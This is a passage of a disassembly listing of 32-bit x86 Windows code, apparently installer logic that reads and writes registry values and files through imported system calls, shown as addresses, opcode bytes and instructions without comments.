  4024c0:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4024c3:	8b f8                	mov    %eax,%edi
  4024c5:	85 d2                	test   %edx,%edx
  4024c7:	74 0b                	je     0x4024d4
  4024c9:	6a 11                	push   $0x11
  4024cb:	5e                   	pop    %esi
  4024cc:	e8 4b f0 ff ff       	call   0x40151c
  4024d1:	89 45 08             	mov    %eax,0x8(%ebp)
  4024d4:	39 5d ec             	cmp    %ebx,-0x14(%ebp)
  4024d7:	74 0a                	je     0x4024e3
  4024d9:	6a 22                	push   $0x22
  4024db:	5e                   	pop    %esi
  4024dc:	e8 3b f0 ff ff       	call   0x40151c
  4024e1:	8b d8                	mov    %eax,%ebx
  4024e3:	6a cd                	push   $0xffffffcd
  4024e5:	5e                   	pop    %esi
  4024e6:	e8 31 f0 ff ff       	call   0x40151c
  4024eb:	50                   	push   %eax
  4024ec:	53                   	push   %ebx
  4024ed:	ff 75 08             	push   0x8(%ebp)
  4024f0:	57                   	push   %edi
  4024f1:	ff 15 40 81 40 00    	call   *0x408140
  4024f7:	e9 dd f2 ff ff       	jmp    0x4017d9
  4024fc:	a1 c8 82 40 00       	mov    0x4082c8,%eax
  402501:	89 45 c0             	mov    %eax,-0x40(%ebp)
  402504:	a1 cc 82 40 00       	mov    0x4082cc,%eax
  402509:	33 f6                	xor    %esi,%esi
  40250b:	46                   	inc    %esi
  40250c:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40250f:	e8 08 f0 ff ff       	call   0x40151c
  402514:	6a 12                	push   $0x12
  402516:	5e                   	pop    %esi
  402517:	8b d8                	mov    %eax,%ebx
  402519:	e8 fe ef ff ff       	call   0x40151c
  40251e:	6a dd                	push   $0xffffffdd
  402520:	5e                   	pop    %esi
  402521:	89 45 08             	mov    %eax,0x8(%ebp)
  402524:	e8 f3 ef ff ff       	call   0x40151c
  402529:	50                   	push   %eax
  40252a:	68 03 20 00 00       	push   $0x2003
  40252f:	57                   	push   %edi
  402530:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402533:	50                   	push   %eax
  402534:	ff 75 08             	push   0x8(%ebp)
  402537:	53                   	push   %ebx
  402538:	ff 15 44 81 40 00    	call   *0x408144
  40253e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402541:	50                   	push   %eax
  402542:	57                   	push   %edi
  402543:	ff 15 1c 81 40 00    	call   *0x40811c
  402549:	e9 1c f4 ff ff       	jmp    0x40196a
  40254e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  402552:	75 2c                	jne    0x402580
  402554:	6a 02                	push   $0x2
  402556:	e8 b2 f0 ff ff       	call   0x40160d
  40255b:	8b f8                	mov    %eax,%edi
  40255d:	85 ff                	test   %edi,%edi
  40255f:	0f 84 7c f2 ff ff    	je     0x4017e1
  402565:	6a 33                	push   $0x33
  402567:	5e                   	pop    %esi
  402568:	e8 af ef ff ff       	call   0x40151c
  40256d:	50                   	push   %eax
  40256e:	57                   	push   %edi
  40256f:	ff 15 10 80 40 00    	call   *0x408010
  402575:	57                   	push   %edi
  402576:	8b f0                	mov    %eax,%esi
  402578:	ff 15 08 80 40 00    	call   *0x408008
  40257e:	eb 2b                	jmp    0x4025ab
  402580:	6a 22                	push   $0x22
  402582:	5e                   	pop    %esi
  402583:	e8 94 ef ff ff       	call   0x40151c
  402588:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40258b:	85 c9                	test   %ecx,%ecx
  40258d:	75 0c                	jne    0x40259b
  40258f:	8b 0d 84 46 47 00    	mov    0x474684,%ecx
  402595:	81 c1 01 00 00 80    	add    $0x80000001,%ecx
  40259b:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40259e:	83 e2 02             	and    $0x2,%edx
  4025a1:	52                   	push   %edx
  4025a2:	50                   	push   %eax
  4025a3:	51                   	push   %ecx
  4025a4:	e8 ae ef ff ff       	call   0x401557
  4025a9:	8b f0                	mov    %eax,%esi
  4025ab:	85 f6                	test   %esi,%esi
  4025ad:	0f 84 65 07 00 00    	je     0x402d18
  4025b3:	e9 29 f2 ff ff       	jmp    0x4017e1
  4025b8:	85 c0                	test   %eax,%eax
  4025ba:	74 04                	je     0x4025c0
  4025bc:	8b f8                	mov    %eax,%edi
  4025be:	eb 0c                	jmp    0x4025cc
  4025c0:	8b 3d 84 46 47 00    	mov    0x474684,%edi
  4025c6:	81 c7 01 00 00 80    	add    $0x80000001,%edi
  4025cc:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4025cf:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  4025d2:	6a 02                	push   $0x2
  4025d4:	5e                   	pop    %esi
  4025d5:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  4025d8:	e8 3f ef ff ff       	call   0x40151c
  4025dd:	6a 11                	push   $0x11
  4025df:	5e                   	pop    %esi
  4025e0:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4025e3:	e8 34 ef ff ff       	call   0x40151c
  4025e8:	33 c9                	xor    %ecx,%ecx
  4025ea:	51                   	push   %ecx
  4025eb:	8d 55 08             	lea    0x8(%ebp),%edx
  4025ee:	52                   	push   %edx
  4025ef:	8b 15 b0 46 47 00    	mov    0x4746b0,%edx
  4025f5:	51                   	push   %ecx
  4025f6:	83 ca 02             	or     $0x2,%edx
  4025f9:	52                   	push   %edx
  4025fa:	51                   	push   %ecx
  4025fb:	51                   	push   %ecx
  4025fc:	51                   	push   %ecx
  4025fd:	50                   	push   %eax
  4025fe:	57                   	push   %edi
  4025ff:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402606:	ff 15 14 80 40 00    	call   *0x408014
  40260c:	85 c0                	test   %eax,%eax
  40260e:	0f 85 04 07 00 00    	jne    0x402d18
  402614:	bf d8 20 41 00       	mov    $0x4120d8,%edi
  402619:	83 fb 01             	cmp    $0x1,%ebx
  40261c:	75 12                	jne    0x402630
  40261e:	6a 23                	push   $0x23
  402620:	5e                   	pop    %esi
  402621:	e8 f6 ee ff ff       	call   0x40151c
  402626:	57                   	push   %edi
  402627:	e8 b9 39 00 00       	call   0x405fe5
  40262c:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  402630:	83 fb 04             	cmp    $0x4,%ebx
  402633:	75 0f                	jne    0x402644
  402635:	6a 03                	push   $0x3
  402637:	59                   	pop    %ecx
  402638:	e8 c9 ee ff ff       	call   0x401506
  40263d:	53                   	push   %ebx
  40263e:	a3 d8 20 41 00       	mov    %eax,0x4120d8
  402643:	58                   	pop    %eax
  402644:	83 fb 03             	cmp    $0x3,%ebx
  402647:	75 10                	jne    0x402659
  402649:	68 18 c0 00 00       	push   $0xc018
  40264e:	57                   	push   %edi
  40264f:	6a 00                	push   $0x0
  402651:	ff 75 e8             	push   -0x18(%ebp)
  402654:	e8 1f 0b 00 00       	call   0x403178
  402659:	50                   	push   %eax
  40265a:	57                   	push   %edi
  40265b:	ff 75 c4             	push   -0x3c(%ebp)
  40265e:	6a 00                	push   $0x0
  402660:	ff 75 cc             	push   -0x34(%ebp)
  402663:	ff 75 08             	push   0x8(%ebp)
  402666:	ff 15 18 80 40 00    	call   *0x408018
  40266c:	85 c0                	test   %eax,%eax
  40266e:	75 03                	jne    0x402673
  402670:	21 45 fc             	and    %eax,-0x4(%ebp)
  402673:	ff 75 08             	push   0x8(%ebp)
  402676:	ff 15 08 80 40 00    	call   *0x408008
  40267c:	e9 97 06 00 00       	jmp    0x402d18
  402681:	68 19 00 02 00       	push   $0x20019
  402686:	e8 82 ef ff ff       	call   0x40160d
  40268b:	6a 33                	push   $0x33
  40268d:	5e                   	pop    %esi
  40268e:	8b d8                	mov    %eax,%ebx
  402690:	e8 87 ee ff ff       	call   0x40151c
  402695:	33 c9                	xor    %ecx,%ecx
  402697:	66 89 0f             	mov    %cx,(%edi)
  40269a:	85 db                	test   %ebx,%ebx
  40269c:	0f 84 3f f1 ff ff    	je     0x4017e1
  4026a2:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4026a5:	51                   	push   %ecx
  4026a6:	57                   	push   %edi
  4026a7:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4026aa:	51                   	push   %ecx
  4026ab:	6a 00                	push   $0x0
  4026ad:	50                   	push   %eax
  4026ae:	53                   	push   %ebx
  4026af:	c7 45 f4 08 40 00 00 	movl   $0x4008,-0xc(%ebp)
  4026b6:	ff 15 1c 80 40 00    	call   *0x40801c
  4026bc:	33 c9                	xor    %ecx,%ecx
  4026be:	41                   	inc    %ecx
  4026bf:	85 c0                	test   %eax,%eax
  4026c1:	75 37                	jne    0x4026fa
  4026c3:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  4026c7:	74 1c                	je     0x4026e5
  4026c9:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4026cc:	74 06                	je     0x4026d4
  4026ce:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  4026d2:	75 26                	jne    0x4026fa
  4026d4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4026d7:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4026da:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4026dd:	33 c0                	xor    %eax,%eax
  4026df:	66 89 04 4f          	mov    %ax,(%edi,%ecx,2)
  4026e3:	eb 1d                	jmp    0x402702
  4026e5:	ff 37                	push   (%edi)
  4026e7:	33 c0                	xor    %eax,%eax
  4026e9:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  4026ec:	57                   	push   %edi
  4026ed:	0f 94 c0             	sete   %al
  4026f0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4026f3:	e8 1e 38 00 00       	call   0x405f16
  4026f8:	eb 08                	jmp    0x402702
  4026fa:	33 c0                	xor    %eax,%eax
  4026fc:	66 89 07             	mov    %ax,(%edi)
  4026ff:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  402702:	53                   	push   %ebx
  402703:	e9 6e ff ff ff       	jmp    0x402676
  402708:	68 19 00 02 00       	push   $0x20019
  40270d:	e8 fb ee ff ff       	call   0x40160d
  402712:	6a 03                	push   $0x3
  402714:	59                   	pop    %ecx
  402715:	8b f0                	mov    %eax,%esi
  402717:	e8 ea ed ff ff       	call   0x401506
  40271c:	33 c9                	xor    %ecx,%ecx
  40271e:	33 d2                	xor    %edx,%edx
  402720:	66 89 0f             	mov    %cx,(%edi)
  402723:	3b f2                	cmp    %edx,%esi
  402725:	0f 84 b6 f0 ff ff    	je     0x4017e1
  40272b:	b9 03 20 00 00       	mov    $0x2003,%ecx
  402730:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402733:	39 55 ec             	cmp    %edx,-0x14(%ebp)
  402736:	74 0c                	je     0x402744
  402738:	51                   	push   %ecx
  402739:	57                   	push   %edi
  40273a:	50                   	push   %eax
  40273b:	56                   	push   %esi
  40273c:	ff 15 00 80 40 00    	call   *0x408000
  402742:	eb 19                	jmp    0x40275d
  402744:	52                   	push   %edx
  402745:	52                   	push   %edx
  402746:	52                   	push   %edx
  402747:	52                   	push   %edx
  402748:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40274b:	51                   	push   %ecx
  40274c:	57                   	push   %edi
  40274d:	50                   	push   %eax
  40274e:	56                   	push   %esi
  40274f:	ff 15 20 80 40 00    	call   *0x408020
  402755:	85 c0                	test   %eax,%eax
  402757:	0f 85 84 f0 ff ff    	jne    0x4017e1
  40275d:	33 c0                	xor    %eax,%eax
  40275f:	66 89 87 06 40 00 00 	mov    %ax,0x4006(%edi)
  402766:	56                   	push   %esi
  402767:	e9 0a ff ff ff       	jmp    0x402676
  40276c:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402770:	0f 84 a2 05 00 00    	je     0x402d18
  402776:	57                   	push   %edi
  402777:	e8 b3 37 00 00       	call   0x405f2f
  40277c:	50                   	push   %eax
  40277d:	ff 15 bc 80 40 00    	call   *0x4080bc
  402783:	e9 90 05 00 00       	jmp    0x402d18
  402788:	6a ed                	push   $0xffffffed
  40278a:	5e                   	pop    %esi
  40278b:	e8 8c ed ff ff       	call   0x40151c
  402790:	ff 75 e4             	push   -0x1c(%ebp)
  402793:	ff 75 e0             	push   -0x20(%ebp)
  402796:	50                   	push   %eax
  402797:	e8 79 36 00 00       	call   0x405e15
  40279c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40279f:	0f 85 6c 05 00 00    	jne    0x402d11
  4027a5:	33 c0                	xor    %eax,%eax
  4027a7:	66 89 07             	mov    %ax,(%edi)
  4027aa:	e9 32 f0 ff ff       	jmp    0x4017e1
  4027af:	bb 04 20 00 00       	mov    $0x2004,%ebx
  4027b4:	53                   	push   %ebx
  4027b5:	6a 40                	push   $0x40
  4027b7:	ff 15 24 81 40 00    	call   *0x408124
  4027bd:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  4027c1:	8b f0                	mov    %eax,%esi
  4027c3:	89 75 08             	mov    %esi,0x8(%ebp)
  4027c6:	74 0f                	je     0x4027d7
  4027c8:	33 c9                	xor    %ecx,%ecx
  4027ca:	41                   	inc    %ecx
  4027cb:	e8 36 ed ff ff       	call   0x401506
  4027d0:	88 06                	mov    %al,(%esi)
  4027d2:	33 c0                	xor    %eax,%eax
  4027d4:	40                   	inc    %eax
  4027d5:	eb 28                	jmp    0x4027ff
  4027d7:	6a 11                	push   $0x11
  4027d9:	5e                   	pop    %esi
  4027da:	e8 3d ed ff ff       	call   0x40151c
  4027df:	33 c0                	xor    %eax,%eax
  4027e1:	50                   	push   %eax
  4027e2:	50                   	push   %eax
  4027e3:	53                   	push   %ebx
  4027e4:	ff 75 08             	push   0x8(%ebp)
  4027e7:	6a ff                	push   $0xffffffff
  4027e9:	68 d0 e0 40 00       	push   $0x40e0d0
  4027ee:	50                   	push   %eax
  4027ef:	50                   	push   %eax
  4027f0:	ff 15 48 81 40 00    	call   *0x408148
  4027f6:	ff 75 08             	push   0x8(%ebp)
  4027f9:	ff 15 50 81 40 00    	call   *0x408150
  4027ff:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402803:	74 1b                	je     0x402820
  402805:	6a 00                	push   $0x0
  402807:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40280a:	51                   	push   %ecx
  40280b:	50                   	push   %eax
  40280c:	ff 75 08             	push   0x8(%ebp)
  40280f:	57                   	push   %edi
  402810:	e8 1a 37 00 00       	call   0x405f2f
  402815:	50                   	push   %eax
  402816:	ff 15 54 81 40 00    	call   *0x408154
  40281c:	85 c0                	test   %eax,%eax
  40281e:	75 07                	jne    0x402827
  402820:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402827:	ff 75 08             	push   0x8(%ebp)
  40282a:	e9 ca f9 ff ff       	jmp    0x4021f9
  40282f:	6a 02                	push   $0x2
  402831:	59                   	pop    %ecx
  402832:	33 f6                	xor    %esi,%esi
  402834:	e8 cd ec ff ff       	call   0x401506
  402839:	83 f8 01             	cmp    $0x1,%eax
  40283c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40283f:	0f 8c d3 04 00 00    	jl     0x402d18
  402845:	b9 03 20 00 00       	mov    $0x2003,%ecx
  40284a:	3b c1                	cmp    %ecx,%eax
  40284c:	7e 03                	jle    0x402851
  40284e:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  402851:	66 39 37             	cmp    %si,(%edi)
  402854:	0f 84 b3 00 00 00    	je     0x40290d
  40285a:	57                   	push   %edi
  40285b:	c6 45 d3 00          	movb   $0x0,-0x2d(%ebp)
  40285f:	e8 cb 36 00 00       	call   0x405f2f
  402864:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  402867:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40286a:	0f 8e 9d 00 00 00    	jle    0x40290d
  402870:	6a 00                	push   $0x0
  402872:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  402875:	50                   	push   %eax
  402876:	6a 01                	push   $0x1
  402878:	8d 45 0b             	lea    0xb(%ebp),%eax
  40287b:	50                   	push   %eax
  40287c:	ff 75 d4             	push   -0x2c(%ebp)
  40287f:	ff 15 58 81 40 00    	call   *0x408158
  402885:	85 c0                	test   %eax,%eax
  402887:	0f 84 80 00 00 00    	je     0x40290d
  40288d:	83 7d c4 01          	cmpl   $0x1,-0x3c(%ebp)
  402891:	75 7a                	jne    0x40290d
  402893:	33 ff                	xor    %edi,%edi
  402895:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  402898:	75 39                	jne    0x4028d3
  40289a:	6a 02                	push   $0x2
  40289c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40289f:	50                   	push   %eax
  4028a0:	6a 01                	push   $0x1
  4028a2:	8d 45 0b             	lea    0xb(%ebp),%eax
  4028a5:	50                   	push   %eax
  4028a6:	57                   	push   %edi
  4028a7:	57                   	push   %edi
  4028a8:	ff 15 5c 81 40 00    	call   *0x40815c
  4028ae:	8a 45 d3             	mov    -0x2d(%ebp),%al
  4028b1:	3c 0d                	cmp    $0xd,%al
  4028b3:	74 2e                	je     0x4028e3
  4028b5:	3c 0a                	cmp    $0xa,%al
  4028b7:	74 2a                	je     0x4028e3
  4028b9:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  4028bd:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  4028c1:	8a 45 0b             	mov    0xb(%ebp),%al
  4028c4:	46                   	inc    %esi
  4028c5:	88 45 d3             	mov    %al,-0x2d(%ebp)
  4028c8:	84 c0                	test   %al,%al
  4028ca:	74 41                	je     0x40290d
  4028cc:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  4028cf:	7c 9f                	jl     0x402870
  4028d1:	eb 3a                	jmp    0x40290d
  4028d3:	0f b6 45 0b          	movzbl 0xb(%ebp),%eax
  4028d7:	50                   	push   %eax
  4028d8:	53                   	push   %ebx
  4028d9:	e8 38 36 00 00       	call   0x405f16
  4028de:	e9 3e 04 00 00       	jmp    0x402d21
  4028e3:	3a 45 0b             	cmp    0xb(%ebp),%al
  4028e6:	74 17                	je     0x4028ff
  4028e8:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  4028ec:	74 06                	je     0x4028f4
  4028ee:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  4028f2:	75 0b                	jne    0x4028ff
  4028f4:	66 8b 45 f8          	mov    -0x8(%ebp),%ax
  4028f8:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  4028fc:	46                   	inc    %esi
  4028fd:	eb 0e                	jmp    0x40290d
  4028ff:	6a 01                	push   $0x1
  402901:	57                   	push   %edi
  402902:	6a ff                	push   $0xffffffff
  402904:	ff 75 d4             	push   -0x2c(%ebp)
  402907:	ff 15 60 81 40 00    	call   *0x408160
  40290d:	33 c0                	xor    %eax,%eax
  40290f:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  402913:	85 f6                	test   %esi,%esi
  402915:	e9 c1 ee ff ff       	jmp    0x4017db
  40291a:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  40291e:	74 13                	je     0x402933
  402920:	33 c9                	xor    %ecx,%ecx
  402922:	41                   	inc    %ecx
  402923:	e8 de eb ff ff       	call   0x401506
  402928:	66 a3 d0 e0 40 00    	mov    %ax,0x40e0d0
  40292e:	33 c0                	xor    %eax,%eax
  402930:	40                   	inc    %eax
  402931:	eb 0e                	jmp    0x402941
  402933:	6a 11                	push   $0x11
  402935:	5e                   	pop    %esi
  402936:	e8 e1 eb ff ff       	call   0x40151c
  40293b:	50                   	push   %eax
  40293c:	e8 a4 36 00 00       	call   0x405fe5
  402941:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402945:	0f 84 96 ee ff ff    	je     0x4017e1
  40294b:	6a 00                	push   $0x0
  40294d:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402950:	51                   	push   %ecx
  402951:	03 c0                	add    %eax,%eax
  402953:	50                   	push   %eax
  402954:	68 d0 e0 40 00       	push   $0x40e0d0
  402959:	57                   	push   %edi
  40295a:	e8 d0 35 00 00       	call   0x405f2f
  40295f:	50                   	push   %eax
  402960:	ff 15 54 81 40 00    	call   *0x408154
  402966:	e9 6e ee ff ff       	jmp    0x4017d9
  40296b:	6a 02                	push   $0x2
  40296d:	59                   	pop    %ecx
  40296e:	33 f6                	xor    %esi,%esi
  402970:	e8 91 eb ff ff       	call   0x401506
  402975:	83 f8 01             	cmp    $0x1,%eax
  402978:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40297b:	0f 8c 97 03 00 00    	jl     0x402d18
  402981:	b9 03 20 00 00       	mov    $0x2003,%ecx
  402986:	3b c1                	cmp    %ecx,%eax
  402988:	7e 03                	jle    0x40298d
  40298a:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40298d:	66 39 37             	cmp    %si,(%edi)
  402990:	0f 84 77 ff ff ff    	je     0x40290d
  402996:	21 75 08             	and    %esi,0x8(%ebp)
  402999:	57                   	push   %edi
  40299a:	e8 90 35 00 00       	call   0x405f2f
  40299f:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  4029a2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4029a5:	0f 8e 62 ff ff ff    	jle    0x40290d
  4029ab:	8b 7d 08             	mov    0x8(%ebp),%edi
  4029ae:	6a 00                	push   $0x0
  4029b0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4029b3:	50                   	push   %eax
  4029b4:	6a 02                	push   $0x2
  4029b6:	8d 45 08             	lea    0x8(%ebp),%eax
  4029b9:	50                   	push   %eax
  4029ba:	ff 75 d4             	push   -0x2c(%ebp)
  4029bd:	ff 15 58 81 40 00    	call   *0x408158
  4029c3:	85 c0                	test   %eax,%eax
  4029c5:	0f 84 42 ff ff ff    	je     0x40290d
  4029cb:	83 7d c4 02          	cmpl   $0x2,-0x3c(%ebp)
  4029cf:	0f 85 38 ff ff ff    	jne    0x40290d
  4029d5:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  4029d9:	75 2b                	jne    0x402a06
  4029db:	66 83 ff 0d          	cmp    $0xd,%di
  4029df:	74 2e                	je     0x402a0f
  4029e1:	66 83 ff 0a          	cmp    $0xa,%di
  4029e5:	74 28                	je     0x402a0f
  4029e7:	66 8b 45 08          	mov    0x8(%ebp),%ax
  4029eb:	66 89 04 73          	mov    %ax,(%ebx,%esi,2)
  4029ef:	46                   	inc    %esi
  4029f0:	0f b7 f8             	movzwl %ax,%edi
  4029f3:	66 85 c0             	test   %ax,%ax
  4029f6:	0f 84 11 ff ff ff    	je     0x40290d
  4029fc:	3b 75 f8             	cmp    -0x8(%ebp),%esi
  4029ff:	7c ad                	jl     0x4029ae
  402a01:	e9 07 ff ff ff       	jmp    0x40290d
  402a06:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
  402a0a:	e9 c8 fe ff ff       	jmp    0x4028d7
  402a0f:	66 8b 45 08          	mov    0x8(%ebp),%ax
  402a13:	66 3b f8             	cmp    %ax,%di
  402a16:	74 14                	je     0x402a2c
  402a18:	66 83 f8 0d          	cmp    $0xd,%ax
  402a1c:	0f 84 d6 fe ff ff    	je     0x4028f8
  402a22:	66 83 f8 0a          	cmp    $0xa,%ax
  402a26:	0f 84 cc fe ff ff    	je     0x4028f8
  402a2c:	6a 01                	push   $0x1
  402a2e:	6a 00                	push   $0x0
  402a30:	6a fe                	push   $0xfffffffe
  402a32:	e9 cd fe ff ff       	jmp    0x402904
  402a37:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402a3b:	0f 84 d7 02 00 00    	je     0x402d18
  402a41:	ff 75 e8             	push   -0x18(%ebp)
  402a44:	6a 00                	push   $0x0
  402a46:	6a 02                	push   $0x2
  402a48:	59                   	pop    %ecx
  402a49:	e8 b8 ea ff ff       	call   0x401506
  402a4e:	50                   	push   %eax
  402a4f:	57                   	push   %edi
  402a50:	e8 da 34 00 00       	call   0x405f2f
  402a55:	50                   	push   %eax
  402a56:	ff 15 60 81 40 00    	call   *0x408160
  402a5c:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  402a60:	0f 8c b2 02 00 00    	jl     0x402d18
  402a66:	50                   	push   %eax
  402a67:	53                   	push   %ebx
  402a68:	e9 a6 02 00 00       	jmp    0x402d13
  402a6d:	66 83 3f 00          	cmpw   $0x0,(%edi)
  402a71:	0f 84 a1 02 00 00    	je     0x402d18
  402a77:	57                   	push   %edi
  402a78:	e8 b2 34 00 00       	call   0x405f2f
  402a7d:	50                   	push   %eax
  402a7e:	ff 15 64 81 40 00    	call   *0x408164
  402a84:	e9 8f 02 00 00       	jmp    0x402d18
  402a89:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  402a8d:	0f 84 df ee ff ff    	je     0x401972
  402a93:	8d 85 5c fd ff ff    	lea    -0x2a4(%ebp),%eax
  402a99:	50                   	push   %eax
  402a9a:	53                   	push   %ebx
  402a9b:	e8 8f 34 00 00       	call   0x405f2f
  402aa0:	50                   	push   %eax
  402aa1:	ff 15 68 81 40 00    	call   *0x408168
  402aa7:	85 c0                	test   %eax,%eax
  402aa9:	0f 84 c3 ee ff ff    	je     0x401972
  402aaf:	eb 2c                	jmp    0x402add
  402ab1:	6a 02                	push   $0x2
  402ab3:	5e                   	pop    %esi
  402ab4:	e8 63 ea ff ff       	call   0x40151c
  402ab9:	8d 8d 5c fd ff ff    	lea    -0x2a4(%ebp),%ecx
  402abf:	51                   	push   %ecx
  402ac0:	50                   	push   %eax
  402ac1:	ff 15 6c 81 40 00    	call   *0x40816c
  402ac7:	83 f8 ff             	cmp    $0xffffffff,%eax
  402aca:	75 0a                	jne    0x402ad6
  402acc:	33 c0                	xor    %eax,%eax
  402ace:	66 89 03             	mov    %ax,(%ebx)
  402ad1:	e9 cf fc ff ff       	jmp    0x4027a5
  402ad6:	50                   	push   %eax
  402ad7:	53                   	push   %ebx
  402ad8:	e8 39 34 00 00       	call   0x405f16
  402add:	8d 85 88 fd ff ff    	lea    -0x278(%ebp),%eax
  402ae3:	50                   	push   %eax
  402ae4:	57                   	push   %edi
  402ae5:	e8 e5 34 00 00       	call   0x405fcf
  402aea:	e9 29 02 00 00       	jmp    0x402d18
  402aef:	6a f0                	push   $0xfffffff0
  402af1:	5e                   	pop    %esi
  402af2:	bb 66 fd ff ff       	mov    $0xfffffd66,%ebx
  402af7:	e8 20 ea ff ff       	call   0x40151c
  402afc:	8b f8                	mov    %eax,%edi
  402afe:	57                   	push   %edi
  402aff:	89 7d cc             	mov    %edi,-0x34(%ebp)
  402b02:	e8 84 31 00 00       	call   0x405c8b
  402b07:	85 c0                	test   %eax,%eax
  402b09:	75 08                	jne    0x402b13
  402b0b:	6a ed                	push   $0xffffffed
  402b0d:	5e                   	pop    %esi
  402b0e:	e8 09 ea ff ff       	call   0x40151c
  402b13:	57                   	push   %edi
  402b14:	e8 dc 32 00 00       	call   0x405df5
  402b19:	6a 02                	push   $0x2
  402b1b:	68 00 00 00 40       	push   $0x40000000
  402b20:	57                   	push   %edi
  402b21:	e8 ef 32 00 00       	call   0x405e15
  402b26:	89 45 08             	mov    %eax,0x8(%ebp)
  402b29:	83 f8 ff             	cmp    $0xffffffff,%eax
  402b2c:	0f 84 9d 00 00 00    	je     0x402bcf
  402b32:	a1 2c 46 47 00       	mov    0x47462c,%eax
  402b37:	8b 35 24 81 40 00    	mov    0x408124,%esi
  402b3d:	50                   	push   %eax
  402b3e:	6a 40                	push   $0x40
  402b40:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402b43:	ff d6                	call   *%esi
  402b45:	8b f8                	mov    %eax,%edi
  402b47:	85 ff                	test   %edi,%edi
  402b49:	74 7b                	je     0x402bc6
  402b4b:	6a 00                	push   $0x0
  402b4d:	e8 91 04 00 00       	call   0x402fe3
  402b52:	ff 75 d4             	push   -0x2c(%ebp)
  402b55:	57                   	push   %edi
  402b56:	e8 56 04 00 00       	call   0x402fb1
  402b5b:	ff 75 e4             	push   -0x1c(%ebp)
  402b5e:	6a 40                	push   $0x40
  402b60:	ff d6                	call   *%esi
  402b62:	8b f0                	mov    %eax,%esi
  402b64:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  402b67:	85 f6                	test   %esi,%esi
  402b69:	74 32                	je     0x402b9d
  402b6b:	ff 75 e4             	push   -0x1c(%ebp)
  402b6e:	56                   	push   %esi
  402b6f:	6a 00                	push   $0x0
  402b71:	ff 75 e0             	push   -0x20(%ebp)
  402b74:	e8 ff 05 00 00       	call   0x403178
  402b79:	eb 14                	jmp    0x402b8f
  402b7b:	8b 1e                	mov    (%esi),%ebx
  402b7d:	8b 46 04             	mov    0x4(%esi),%eax
  402b80:	53                   	push   %ebx
  402b81:	83 c6 08             	add    $0x8,%esi
  402b84:	56                   	push   %esi
  402b85:	03 c7                	add    %edi,%eax
  402b87:	50                   	push   %eax
  402b88:	e8 44 32 00 00       	call   0x405dd1
  402b8d:	03 f3                	add    %ebx,%esi
  402b8f:	80 3e 00             	cmpb   $0x0,(%esi)
  402b92:	75 e7                	jne    0x402b7b
  402b94:	ff 75 c4             	push   -0x3c(%ebp)
  402b97:	ff 15 30 81 40 00    	call   *0x408130
  402b9d:	33 f6                	xor    %esi,%esi
  402b9f:	56                   	push   %esi
  402ba0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402ba3:	50                   	push   %eax
  402ba4:	ff 75 d4             	push   -0x2c(%ebp)
  402ba7:	57                   	push   %edi
  402ba8:	ff 75 08             	push   0x8(%ebp)
  402bab:	ff 15 54 81 40 00    	call   *0x408154
  402bb1:	57                   	push   %edi
  402bb2:	ff 15 30 81 40 00    	call   *0x408130
  402bb8:	56                   	push   %esi
  402bb9:	56                   	push   %esi
  402bba:	ff 75 08             	push   0x8(%ebp)
  402bbd:	6a ff                	push   $0xffffffff
